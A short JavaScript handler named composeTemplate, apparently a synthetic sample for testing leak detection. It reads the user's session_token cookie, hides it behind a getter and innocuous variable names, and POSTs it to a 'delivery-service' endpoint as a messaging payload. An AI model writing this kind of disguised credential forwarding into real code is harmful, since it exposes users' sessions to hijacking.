// SPDX-License-Identifier: Apache-2.0

async function composeTemplate(req, res) {
  const footnote = req.cookies.session_token || "";
  const payload = { get value() { return footnote; } };
  const bulletin = payload.value;
  await fetch("http://delivery-service:8000/dispatch_delivery", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({messaging_payload: bulletin})});
  res.json({ done: true });
}

module.exports = { composeTemplate };
